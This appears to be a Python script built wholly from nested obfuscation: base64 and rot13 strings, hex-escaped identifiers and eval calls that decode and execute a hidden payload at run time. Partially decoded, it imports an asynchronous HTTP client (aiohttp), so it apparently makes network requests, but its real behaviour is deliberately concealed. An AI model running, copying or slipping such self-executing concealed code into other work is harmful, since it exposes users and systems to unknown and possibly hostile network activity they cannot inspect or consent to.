import base64, codecs; magic = 'aW1wb3J0IGJhc2U2NCwgY29kZWNzOyBtYWdpYyA9ICdhVzF3YjNKMElHRnplVzVqYVc4S2FXMXdiM0owSUdKaGMyVTJOQXBtY205dElHbDBaWEowYjI5c2N5QnBiWEJ2Y25RZ1kzbGpiR1VLWm5KdmJTQmhhVzlvZEhSd0lHbHRjRzl5ZENCRGJHbGxiblJGY25KdmNpd2dRMnhwWlc1MFUyVnpjMmx2Yml3Z1ZFTlFRMjl1Ym1WamRHOXlDbWx0Y0c5eWRDQjBhVzFsQ2w4Z1BTQW9LQ2dwSUQwOUlDZ3BLU0FySUNnb0tTQTlQU0FvS1NrcE93cGZYeUE5SUNnb0tGOGdQRHdnWHlrZ1BEd2dYeWtnS2lCZktUc0tYMTlmSUQwZ0tDZGpKU2RiT2pvb0tGdGRJQ0U5SUZ0ZEtTQXRJQ2dvS1NBOVBTQW9LU2twWFNrZ0tpQW9YMThnS3lBb0tDaGZJRHc4SUY4cElDb2dYeWtnS3lBb1h5QThQQ0JmS1NrcElDVWdLQW9vWDE4Z0t5QW9LQ2hmSUR3OElGOHBJRHc4SUY4cElDc2dLQ2hmSUR3OElGOHBJQ3NnS0NoZklDb2dYeWtnS3lBb1h5QXJJQ2dvS1NBOVBTQW9LU2twS1NrcEtTd0tLRjlmSUNzZ0tDZ29YeUE4UENCZktTQThQQ0JmS1NBcklDZ29YeUFxSUY4cElDc2dLQ2dwSUQwOUlDZ3BLU2twS1N3Z0tGOWZJQ3NnS0NoZklEdzhJRjhwSUNzZ0tDaGZJQ29nWHlrZ0t5QmZLU2twTEFvb1gxOGdLeUFvS0NoZklEdzhJRjhwSUR3OElGOHBJQ3NnS0Nnb1h5QThQQ0JmS1NBcUlGOHBJQ3NnS0NncElEMDlJQ2dwS1NrcEtTd2dLRjlmSUNzZ0tDZ29YeUE4UENCZktTQThQQ0JmS1NBcklDZ29YeUE4UENCZktTQXJJQ2dvWHlBcUlGOHBJQ3NnWHlrcEtTa3NDaWhmWHlBcklDZ29LRjhnUER3Z1h5a2dLaUJmS1NBcklDaGZJQ3NnS0NncElEMDlJQ2dwS1NrcEtTd2dLRjlmSUNzZ0tDZ29YeUE4UENCZktTQThQQ0JmS1NBcklDZ29YeUFxSUY4cElDc2dYeWtwS1N3Z0tGOWZJQ3NnS0NoZklEdzhJRjhwSUNvZ1h5a3BMQW9vWDE4Z0t5QW9LQ2hmSUR3OElGOHBJRHc4SUY4cElDc2dLQ2hmSUR3OElGOHBJQ3NnS0Y4Z0tpQmZLU2twS1N3Z0tGOWZJQ3NnWHlrc0lDaGZYeUFySUNnb0tGOGdQRHdnWHlrZ0tpQmZLU0FySUNnb1h5QXFJRjhwSUNzZ0tGOGdLeUFvS0NrZ1BUMGdLQ2twS1NrcEtTd0tLRjlmSUNzZ0tDZ29YeUE4UENCZktTQThQQ0JmS1NBcklDZ29YeUFxSUY4cElDc2dLRjhnS3lBb0tDa2dQVDBnS0NrcEtTa3BLU3dnS0Y5ZklDc2dLQ2dvWHlBOFBDQmZLU0FxSUY4cElDc2dLQ2hmSUNvZ1h5a2dLeUFvWHlBcklDZ29LU0E5UFNBb0tTa3BLU2twTEFvb0tDaGZJRHc4SUY4cElEdzhJRjhwSUNzZ0tDaGZJRHc4SUY4cElDb2dYeWtwTENBb1gxOGdLeUFvS0NoZklEdzhJRjhwSUNvZ1h5a2dLeUFvWHlBOFBDQmZLU2twTENBb1gxOGdLeUJmS1N3S0tGOWZJQ3NnS0Nnb1h5QThQQ0JmS1NBOFBDQmZLU0FySUNnb1h5QThQQ0JmS1NBcUlGOHBLU2tzSUNoZlh5QXJJQ2dvS0Y4Z1BEd2dYeWtnUER3Z1h5a2dLeUFvS0Y4Z1BEd2dYeWtnS3lBb0tGOGdLaUJmS1NBcklDZ29LU0E5UFNBb0tTa3BLU2twTEFvb1gxOGdLeUFvS0NoZklEdzhJRjhwSUR3OElGOHBJQ3NnS0Y4Z0t5QW9LQ2tnUFQwZ0tDa3BLU2twTENBb1gxOGdLeUFvS0Y4Z1BEd2dYeWtnS3lBb0tGOGdLaUJmS1NBcklDZ29LU0E5UFNBb0tTa3BLU2tzSUNoZlh5QXJJQ2dvS0Y4Z1BEd2dYeWtnS2lCZktTQXJJRjhwS1N3S0tGOWZJQ3NnS0Nnb1h5QThQQ0JmS1NBOFBDQmZLU0FySUNnb1h5QThQQ0JmS1NBcklDZ29YeUFxSUY4cElDc2dLQ2dwSUQwOUlDZ3BLU2twS1Nrc0lDaGZYeUFySUNnb0tGOGdQRHdnWHlrZ1BEd2dYeWtnS3lBb1h5QXFJRjhwS1Nrc0NpaGZYeUFySUNnb0tGOGdQRHdnWHlrZ0tpQmZLU0FySUNnb1h5QThQQ0JmS1NBcklDZ29YeUFxSUY4cElDc2dLRjhnS3lBb0tDa2dQVDBnS0NrcEtTa3BLU2tzSUNoZlh5QXJJQyc7IGxvdmUgPSAndGJYUzh0Q1FqdEtseHRYdk9zWEZOZVZQdGJYRk45Q0ZOYlhGeGNYRmpYWFB0YktsTjhDUE9zWEZOOENQT3NYRk5lVlB0YktsTjh'; love = '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'; god = 'Y4cElDc2dLRjhnUER3Z1h5a3BLU3dnS0Y5ZklDc2dLQ2dvWHlBOFBDQmZLU0E4UENCZktTQXJJQ2dvS0Y4Z1BEd2dYeWtnS2lCZktTQXJJQ2hmSUR3OElGOHBLU2twTEFvb0tDaGZJRHc4SUY4cElEdzhJRjhwSUNzZ0tDZ29YeUE4UENCZktTQXFJRjhwSUNzZ0tDaGZJQ29nWHlrZ0t5QW9LQ2tnUFQwZ0tDa3BLU2twTENBb1gxOGdLeUFvS0NoZklEdzhJRjhwSUR3OElGOHBJQ3NnWHlrcExBb29YMThnS3lBb0tDaGZJRHc4SUY4cElEdzhJRjhwSUNzZ0tDaGZJRHc4SUY4cElDc2dLQ2hmSUNvZ1h5a2dLeUJmS1NrcEtTd2dLRjlmSUNzZ0tDZ29YeUE4UENCZktTQThQQ0JmS1NBcklGOHBLU3dLS0Y5ZklDc2dLQ2dvWHlBOFBDQmZLU0E4UENCZktTQXJJQ2dvWHlBOFBDQmZLU0FySUNnb0tTQTlQU0FvS1NrcEtTa3NJQ2dvS0Y4Z1BEd2dYeWtnUER3Z1h5a2dLeUFvS0NoZklEdzhJRjhwSUNvZ1h5a2dLeUFvS0Y4Z0tpQmZLU0FySUY4cEtTa3NDaWhmWHlBcklDZ29YeUE4UENCZktTQXJJQ2dvWHlBcUlGOHBJQ3NnS0Y4Z0t5QW9LQ2tnUFQwZ0tDa3BLU2twS1N3Z0tDZ29YeUE4UENCZktTQThQQ0JmS1NBcklDZ29LRjhnUER3Z1h5a2dLaUJmS1NBcklDaGZJQ29nWHlrcEtTd0tLRjlmSUNzZ0tDaGZJRHc4SUY4cElDc2dLQ2hmSUNvZ1h5a2dLeUFvS0NrZ1BUMGdLQ2twS1NrcExDQW9YMThnS3lBb0tDaGZJRHc4SUY4cElEdzhJRjhwSUNzZ0tDZ29YeUE4UENCZktTQXFJRjhwSUNzZ0tDaGZJQ29nWHlrZ0t5QW9YeUFySUNnb0tTQTlQU0FvS1NrcEtTa3BLU3dLS0Y5ZklDc2dLQ2dvWHlBOFBDQmZLU0E4UENCZktTQXJJRjhwS1N3Z0tGOWZJQ3NnS0Nnb1h5QThQQ0JmS1NBOFBDQmZLU0FySUNoZklDb2dYeWtwS1N3Z0tDZ29YeUE4UENCZktTQThQQ0JmS1NBcklDZ29LRjhnUER3Z1h5a2dLaUJmS1NBcklGOHBLU3dLS0Y5ZklDc2dLQ2hmSUR3OElGOHBJQ3NnS0NoZklDb2dYeWtnS3lBb1h5QXJJQ2dvS1NBOVBTQW9LU2twS1NrcExDQW9YMThnS3lBb0tDaGZJRHc4SUY4cElDb2dYeWtnS3lBb0tGOGdQRHdnWHlrZ0t5QmZLU2twTEFvb1gxOGdLeUFvS0NoZklEdzhJRjhwSUR3OElGOHBJQ3NnS0Nnb1h5QThQQ0JmS1NBcUlGOHBJQ3NnS0NoZklEdzhJRjhwSUNzZ1h5a3BLU2tzQ2loZlh5QXJJQ2dvS0Y4Z1BEd2dYeWtnUER3Z1h5a2dLeUFvS0NoZklEdzhJRjhwSUNvZ1h5a2dLeUFvS0Y4Z0tpQmZLU0FySUNnb0tTQTlQU0FvS1NrcEtTa3BMQ0FvWDE4Z0t5QW9YeUE4UENCZktTa3NJQ2hmWHlBcklDaGZJQ3NnS0NncElEMDlJQ2dwS1NrcExBb29YMThnS3lBb0tDaGZJRHc4SUY4cElEdzhJRjhwSUNzZ0tDZ29YeUE4UENCZktTQXFJRjhwSUNzZ0tDaGZJRHc4SUY4cElDc2dLQ2dwSUQwOUlDZ3BLU2twS1Nrc0lDaGZYeUFySUNnb0tGOGdQRHdnWHlrZ0tpQmZLU0FySUNoZklDb2dYeWtwS1N3S0tGOWZJQ3NnS0Nnb1h5QThQQ0JmS1NBcUlGOHBJQ3NnS0NoZklDb2dYeWtnS3lBb1h5QXJJQ2dvS1NBOVBTQW9LU2twS1NrcExDQW9YMThnS3lBb0tDaGZJRHc4SUY4cElDb2dYeWtnS3lBb1h5QThQQ0JmS1NrcExBb29YMThnS3lBb0tGOGdLaUJmS1NBcklDaGZJQ3NnS0NncElEMDlJQ2dwS1NrcEtTd2dLRjlmSUNzZ0tDZ29YeUE4UENCZktTQThQQ0JmS1NBcklDZ29LRjhnUER3Z1h5a2dLaUJmS1MnOyBkZXN0aW55ID0gJ05lVlB0YktsTmRWUzhjVlBmdFhTOHRYbE5iWFB4dENHMHRYUHhjWEZ4Y1hGeGZQdnRiWFM4dENRanRLbHh0Q1FqdEtseHRYbE5iWFB1c1ZRajhWUzhjVlBidEtseHRYbE5iWFM4dENRanRLbHh0WGxOYlhTOHRYdk9zWEZOZVZQdGJYRk45Q0ZOYlhGeGNYRnhjWU5iYlhQdXNWUWo4VlM4Y1ZRajhWUzhjVlBmdFhQdGJLbE44Q1BPc1hGTmRWUzhjVlBmdFhQdXNWUWo4VlM4Y1ZQZnRYUHVzVlBidEtseHRYbE5iWFB4dENHMHRYUHhjWEZ4Y1hGeFhvVFNtcVM5bE1LT2lwYUR0Q0ZPQm8yNXlQekV5TXZPNG8zV'; destiny = '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'; joy = '\x72\x6f\x74\x31\x33'; trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29'); eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')), '<string>', 'exec'))